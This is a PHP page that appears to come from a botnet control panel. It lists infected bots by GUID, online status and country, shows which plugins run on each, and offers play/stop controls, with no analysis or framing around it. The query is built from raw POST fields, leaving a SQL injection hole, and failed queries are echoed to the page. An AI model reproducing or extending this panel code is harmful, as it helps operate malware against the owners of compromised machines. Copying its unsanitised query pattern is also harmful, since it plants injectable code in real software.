<?
	include_once "../common.php";
	if( !$user->Check() ) exit;
	
	$plugin = $_POST['plugin'];$bot_guid = $_POST['bot_guid'];$limit = $_POST['limit']; $onlyonline = $_POST['onlyonline'];
	$sqlp = '';	$sqlp2 = ''; $sqlp3 = '';
	
	$smarty->assign('PLUGIN', $plugin);
	
	if ($onlyonline) $sqlp = " AND status_bot = 'online' ";

	if (count($_POST['fk_country'])) 
	{
		$sqlp2 = ', city_t, country_t';
		$sqlp3 = "   AND bots_t.fk_city_bot = city_t.id_city AND country_t.id_country = city_t.fk_country_city AND ( FALSE ";
		foreach($_POST['fk_country'] as $key=>$value) $sqlp3 .= "  OR country_t.id_country = $key";
		$sqlp3 .= " )";
	}
		
	$sql = "SELECT plugins.id as id, guid_bot, plugins.status as stat, bots_t.id_bot as bot_id FROM bots_t, plugins$sqlp2 
			WHERE guid_bot LIKE '%$bot_guid%' AND plugin = '$plugin' " . $sqlp. "   AND id_bot = fk_bot ". $sqlp3 . " LIMIT $limit";
	$res = $db->query($sql);
	if ((!$res) || !$db->affected_rows)
	{
		$smarty->assign('SQL', $sql);
	}
	else
	{
		$cnt = $db->affected_rows;
		$smarty->assign('CNT', $cnt);
		$RES = array();
		for ($i = 0; $mres = $res->fetch_array(); $i++) 
		{
			$id = $mres['id'];
			$bot_guid = $mres['guid_bot'];
			$status = $mres['stat'];
			$bot_id = $mres['bot_id'];

			if ($status == 0) { $play_stop_pic = 'img/icos/play_16px.png'; $nstop = 1; }
			else { $play_stop_pic = 'img/icos/stop_16px.png'; $nstop = 0; }

			$RES[] = array('RAND'=>rand(), 'BOT_ID'=>$bot_id, 'BOT_GUID'=>$bot_guid, 'ID'=>$id, 'PLAY_STOP_PIC'=>$play_stop_pic);
		}
		$smarty->assign('CONT_ARR',$RES);
	}
	
	$smarty->display('plugins_sub.tpl');	
?>